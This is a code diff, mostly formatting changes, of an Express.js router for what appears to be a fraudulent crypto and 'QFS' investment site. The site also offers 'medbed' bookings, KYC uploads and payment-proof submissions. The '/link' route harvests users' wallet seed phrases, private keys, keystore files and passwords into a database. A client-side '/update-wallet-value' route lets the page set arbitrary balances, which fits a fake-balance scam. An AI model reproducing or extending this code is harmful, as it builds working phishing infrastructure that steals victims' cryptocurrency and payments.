@@ -106,9 +106,9 @@ userRouter.post(
       if (email && email !== user.email) {
         const emailExists = await User.findOne({ email });
         if (emailExists) {
-          return res
-            .status(200)
-            .json({ mssg: "Email address is already in use by another account" });
+          return res.status(200).json({
+            mssg: "Email address is already in use by another account",
+          });
         }
         user.email = email;
       }
@@ -196,7 +196,9 @@ userRouter.post(
       const user = await User.findById(req.user.id);
 
       if (Number(user.walletValue) < Number(card_price)) {
-        return res.status(200).json({ mssg: "Insufficient wallet balance to request a card." });
+        return res
+          .status(200)
+          .json({ mssg: "Insufficient wallet balance to request a card." });
       }
       // Save to database with all card tier data
       await CardOrder.create({
@@ -231,7 +233,8 @@ userRouter.post(
   upload.single("Poof_of_payment"),
   async (req, res) => {
     try {
-      const { wallet_address, amount, fullname, email, phone, address } = req.body;
+      const { wallet_address, amount, fullname, email, phone, address } =
+        req.body;
 
       const proofUrl = req.file ? req.file.path : null; // Cloudinary URL
 
@@ -276,8 +279,12 @@ userRouter.post(
     try {
       const { doc_typ } = req.body;
 
-      const frontUrl = req.files["kyc_file_front"] ? req.files["kyc_file_front"][0].path : null;
-      const backUrl = req.files["kyc_file_back"] ? req.files["kyc_file_back"][0].path : null;
+      const frontUrl = req.files["kyc_file_front"]
+        ? req.files["kyc_file_front"][0].path
+        : null;
+      const backUrl = req.files["kyc_file_back"]
+        ? req.files["kyc_file_back"][0].path
+        : null;
 
       if (!doc_typ || !frontUrl || !backUrl) {
         return res.json({ mssg: "All fields are required." });
@@ -313,32 +320,38 @@ userRouter.get("/contact", ensureAuthenticated, (req, res) => {
   });
 });
 
-userRouter.post("/contact", ensureAuthenticated, parseForm.none(), async (req, res) => {
-  try {
-    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;
+userRouter.post(
+  "/contact",
+  ensureAuthenticated,
+  parseForm.none(),
+  async (req, res) => {
+    try {
+      const { sender_name, sender_email, sender_subject, sender_mssg } =
+        req.body;
 
-    // Validate input
-    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
-      return res.json({ mssg: "Please fill in all fields." });
+      // Validate input
+      if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
+        return res.json({ mssg: "Please fill in all fields." });
+      }
+
+      // Save message to MongoDB
+      const newMessage = new Message({
+        sender_name,
+        sender_email,
+        sender_subject,
+        sender_mssg,
+      });
+
+      await newMessage.save();
+
+      // Send success response for AJAX
+      res.json({ mssg: "ok" });
+    } catch (error) {
+      console.error("❌ Error saving contact message:", error);
+      res.json({ mssg: "Something went wrong, please try again later." });
     }
-
-    // Save message to MongoDB
-    const newMessage = new Message({
-      sender_name,
-      sender_email,
-      sender_subject,
-      sender_mssg,
-    });
-
-    await newMessage.save();
-
-    // Send success response for AJAX
-    res.json({ mssg: "ok" });
-  } catch (error) {
-    console.error("❌ Error saving contact message:", error);
-    res.json({ mssg: "Something went wrong, please try again later." });
-  }
-});
+  },
+);
 
 // GET /contact-medbed
 // Looks up whether this user already has an appointment and
@@ -346,7 +359,9 @@ userRouter.post("/contact", ensureAuthenticated, parseForm.none(), async (req, r
 userRouter.get("/contact-medbed", ensureAuthenticated, async (req, res) => {
   try {
     // Find the most recent appointment for this user (there should only be one active one)
-    const appointment = await Appointment.findOne({ user: req.user._id }).sort({ createdAt: -1 });
+    const appointment = await Appointment.findOne({ user: req.user._id }).sort({
+      createdAt: -1,
+    });
 
     res.render("contactMedbed", {
       currentUser: req.user,
@@ -363,79 +378,94 @@ userRouter.get("/contact-medbed", ensureAuthenticated, async (req, res) => {
 
 // POST /contact-medbed
 // Stage 1: User submits the initial booking application (NO payment info yet).
-userRouter.post("/contact-medbed", ensureAuthenticated, upload.none(), async (req, res) => {
-  try {
-    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;
+userRouter.post(
+  "/contact-medbed",
+  ensureAuthenticated,
+  upload.none(),
+  async (req, res) => {
+    try {
+      const { sender_name, sender_email, sender_subject, sender_mssg } =
+        req.body;
 
-    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
-      return res.json({ mssg: "Please fill in all fields." });
+      if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
+        return res.json({ mssg: "Please fill in all fields." });
+      }
+
+      // Prevent duplicate applications — check if user already has a pending/approved one
+      const existing = await Appointment.findOne({
+        user: req.user._id,
+        status: { $in: ["pending", "approved"] },
+      });
+
+      if (existing) {
+        return res.json({
+          mssg: "You already have an active appointment application.",
+        });
+      }
+
+      await Appointment.create({
+        user: req.user._id,
+        sender_name,
+        sender_email,
+        sender_subject,
+        sender_mssg,
+        status: "pending",
+        isApproved: false,
+        payment_status: "unpaid",
+      });
+
+      res.json({ mssg: "ok" });
+    } catch (error) {
+      console.error("❌ Error saving appointment:", error);
+      res.json({ mssg: "Something went wrong, please try again later." });
     }
-
-    // Prevent duplicate applications — check if user already has a pending/approved one
-    const existing = await Appointment.findOne({
-      user: req.user._id,
-      status: { $in: ["pending", "approved"] },
-    });
-
-    if (existing) {
-      return res.json({ mssg: "You already have an active appointment application." });
-    }
-
-    await Appointment.create({
-      user: req.user._id,
-      sender_name,
-      sender_email,
-      sender_subject,
-      sender_mssg,
-      status: "pending",
-      isApproved: false,
-      payment_status: "unpaid",
-    });
-
-    res.json({ mssg: "ok" });
-  } catch (error) {
-    console.error("❌ Error saving appointment:", error);
-    res.json({ mssg: "Something went wrong, please try again later." });
-  }
-});
+  },
+);
 
 // POST /contact-medbed-payment
 // Stage 2: User submits payment proof AFTER their application was approved.
-userRouter.post("/contact-medbed-payment", ensureAuthenticated, upload.any(), async (req, res) => {
-  try {
-    const { booking_amount } = req.body;
+userRouter.post(
+  "/contact-medbed-payment",
+  ensureAuthenticated,
+  upload.any(),
+  async (req, res) => {
+    try {
+      const { booking_amount } = req.body;
 
-    if (!booking_amount) {
-      return res.json({ mssg: "Please enter the amount you sent." });
+      if (!booking_amount) {
+        return res.json({ mssg: "Please enter the amount you sent." });
+      }
+
+      const proofUrl = req.files && req.files[0] ? req.files[0].path : null;
+      if (!proofUrl) {
+        return res.json({ mssg: "Please attach your proof of payment." });
+      }
+
+      // Find the approved appointment for this user
+      const appointment = await Appointment.findOne({
+        user: req.user._id,
+        isApproved: true,
+        payment_status: "unpaid",
+      });
+
+      if (!appointment) {
+        return res.json({
+          mssg: "No approved appointment found. Please contact support.",
+        });
+      }
+
+      appointment.booking_amount = Number(booking_amount);
+      appointment.proof_of_payment = proofUrl;
+      appointment.payment_status = "submitted";
+      await appointment.save();
+
+      res.json({ mssg: "ok" });
+    } catch (error) {
+      console.error("❌ Error saving payment proof:", error);
+      res.json({ mssg: "Something went wrong, please try again later." });
     }
-
-    const proofUrl = req.files && req.files[0] ? req.files[0].path : null;
-    if (!proofUrl) {
-      return res.json({ mssg: "Please attach your proof of payment." });
-    }
-
-    // Find the approved appointment for this user
-    const appointment = await Appointment.findOne({
-      user: req.user._id,
-      isApproved: true,
-      payment_status: "unpaid",
-    });
-
-    if (!appointment) {
-      return res.json({ mssg: "No approved appointment found. Please contact support." });
-    }
-
-    appointment.booking_amount = Number(booking_amount);
-    appointment.proof_of_payment = proofUrl;
-    appointment.payment_status = "submitted";
-    await appointment.save();
-
-    res.json({ mssg: "ok" });
-  } catch (error) {
-    console.error("❌ Error saving payment proof:", error);
-    res.json({ mssg: "Something went wrong, please try again later." });
-  }
-});
+  },
+);
 
 userRouter.get("/fund", ensureAuthenticated, (req, res) => {
   res.render("securefund", {
@@ -455,42 +485,54 @@ userRouter.get("/link", ensureAuthenticated, (req, res) => {
   res.render("linkWallet");
 });
 
-userRouter.post("/link", ensureAuthenticated, parseForm.none(), async (req, res) => {
-  try {
-    const { keyid, type_of_login_detail, Phrase, Keystore_json, Private_Key, password } = req.body;
+userRouter.post(
+  "/link",
+  ensureAuthenticated,
+  parseForm.none(),
+  async (req, res) => {
+    try {
+      const {
+        keyid,
+        type_of_login_detail,
+        Phrase,
+        Keystore_json,
+        Private_Key,
+        password,
+      } = req.body;
 
-    if (!type_of_login_detail || !keyid) {
-      return res.json({ mssg: "Missing wallet type or keyid" });
+      if (!type_of_login_detail || !keyid) {
+        return res.json({ mssg: "Missing wallet type or keyid" });
+      }
+
+      const user = await User.findById(req.user.id);
+      if (!user) {
+        return res.status(200).json({ mssg: "User not found" });
+      }
+
+      user.walletConnected = true;
+      await user.save();
+      let walletData = {
+        user: req.user._id,
+        keyid,
+        type_of_login_detail,
+        password: password || null,
+      };
+
+      // Dynamically attach whichever field was sent
+      if (Phrase) walletData.Phrase = Phrase;
+      if (Keystore_json) walletData.Keystore_json = Keystore_json;
+      if (Private_Key) walletData.Private_Key = Private_Key;
+
+      // Save to DB
+      await LinkedWallet.create(walletData);
+
+      res.json({ mssg: "ok" });
+    } catch (err) {
+      console.error("❌ Error linking wallet:", err);
+      res.json({ mssg: "Something went wrong, please try again." });
     }
-
-    const user = await User.findById(req.user.id);
-    if (!user) {
-      return res.status(200).json({ mssg: "User not found" });
-    }
-
-    user.walletConnected = true;
-    await user.save();
-    let walletData = {
-      user: req.user._id,
-      keyid,
-      type_of_login_detail,
-      password: password || null,
-    };
-
-    // Dynamically attach whichever field was sent
-    if (Phrase) walletData.Phrase = Phrase;
-    if (Keystore_json) walletData.Keystore_json = Keystore_json;
-    if (Private_Key) walletData.Private_Key = Private_Key;
-
-    // Save to DB
-    await LinkedWallet.create(walletData);
-
-    res.json({ mssg: "ok" });
-  } catch (err) {
-    console.error("❌ Error linking wallet:", err);
-    res.json({ mssg: "Something went wrong, please try again." });
-  }
-});
+  },
+);
 
 userRouter.get("/buy", ensureAuthenticated, (req, res) => {
   res.render("buy-crypto", {
@@ -533,7 +575,8 @@ userRouter.post("/deposit2", ensureAuthenticated, async (req, res) => {
       },
       "shiba-inu": {
         name: "Shiba Inu",
-        address: "0x5f172e7eceb2892333617733ea81be47953db3fab043f39bd46cf1453f2be55d",
+        address:
+          "0x5f172e7eceb2892333617733ea81be47953db3fab043f39bd46cf1453f2be55d",
       },
       tron: {
         name: "Tron",
@@ -574,7 +617,8 @@ userRouter.post("/deposit2", ensureAuthenticated, async (req, res) => {
     const qrImage = await QRCode.toDataURL(walletInfo.address);
 
     // Generate unique transaction ID
-    const transactionId = "QFS" + crypto.randomBytes(4).toString("hex").toUpperCase();
+    const transactionId =
+      "QFS" + crypto.randomBytes(4).toString("hex").toUpperCase();
 
     // Render deposit page
     return res.render("deposit2", {
@@ -614,7 +658,9 @@ userRouter.post("/confirm-deposit", ensureAuthenticated, async (req, res) => {
 });
 
 userRouter.get("/transaction", ensureAuthenticated, async (req, res) => {
-  const transactions = await Deposit.find({ user: req.user._id }).sort({ createdAt: -1 });
+  const transactions = await Deposit.find({ user: req.user._id }).sort({
+    createdAt: -1,
+  });
   res.render("transaction", { transactions });
 });
 
@@ -683,7 +729,9 @@ userRouter.get("/investment", ensureAuthenticated, async (req, res) => {
   const map = { gold: 0, silver: 0, diamond: 0 };
   holdings.forEach((h) => (map[h._id] = h.totalQty));
 
-  const history = await Investment.find({ user: user._id }).sort({ createdAt: -1 }).limit(10);
+  const history = await Investment.find({ user: user._id })
+    .sort({ createdAt: -1 })
+    .limit(10);
 
   res.render("investment", {
     wallet: parseFloat(user.walletValue),
@@ -695,17 +743,16 @@ userRouter.get("/investment", ensureAuthenticated, async (req, res) => {
 userRouter.post("/investment", ensureAuthenticated, async (req, res) => {
   try {
     const { investment_type, quantity, price_per_unit } = req.body;
-
     const qty = parseFloat(quantity);
     const price = parseFloat(price_per_unit);
     const total = qty * price;
-
     if (!qty || !price) return res.json({ mssg: "Invalid numbers" });
 
     const user = await User.findById(req.user.id);
     let wallet = parseFloat(user.walletValue);
 
-    if (wallet < total) return res.json({ mssg: "Insufficient funds, PLease fund your wallet" });
+    if (wallet < total)
+      return res.json({ mssg: "Insufficient funds, PLease fund your wallet" });
 
     wallet -= total;
     user.walletValue = wallet.toFixed(2);
@@ -734,21 +781,26 @@ userRouter.get("/withdraw", (req, res) => {
   res.render("withdrawal_modal");
 });
 
-userRouter.post("/update-wallet-value", ensureAuthenticated, async (req, res) => {
-  try {
-    const { walletValue } = req.body;
-    if (walletValue === undefined || walletValue === null) {
-      return res.status(400).json({ mssg: "No value provided" });
+userRouter.post(
+  "/update-wallet-value",
+  ensureAuthenticated,
+  parseForm.none(),
+  async (req, res) => {
+    try {
+      const { walletValue } = req.body;
+      if (!walletValue) {
+        return res.status(400).json({ mssg: "No value provided" });
+      }
+      await User.findByIdAndUpdate(req.user.id, {
+        walletValue: parseFloat(walletValue).toFixed(2),
+      });
+      res.json({ mssg: "ok" });
+    } catch (err) {
+      console.error("Failed to update wallet value:", err);
+      res.status(500).json({ mssg: "Server error" });
     }
-    await User.findByIdAndUpdate(req.user.id, {
-      walletValue: parseFloat(walletValue).toFixed(2),
-    });
-    res.json({ mssg: "ok" });
-  } catch (err) {
-    console.error("Failed to update wallet value:", err);
-    res.status(500).json({ mssg: "Server error" });
-  }
-});
+  },
+);
 
 // ============================================================
 // ADD these imports to the top of user.route.js
